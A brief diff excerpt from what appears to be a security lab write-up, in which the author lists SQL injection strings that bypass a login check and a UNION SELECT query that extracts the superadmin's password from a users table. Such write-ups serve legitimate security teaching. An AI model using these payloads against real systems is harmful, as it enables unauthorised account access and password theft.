@@ -10,7 +10,7 @@ Here are my injections as well as proof of gaining superadmin access:
 	1. Injection to bypass the password validation and login as user:
 		Option 1: probably wrong password' OR TRUE--
 		Option 2: probably wrong password' OR '1' = '1
-		
+		 
 	2. Injection to retrieve superadmin's password:
 		invalid item' UNION SELECT username, password, password FROM users WHERE username = 'superadmin'--
 		
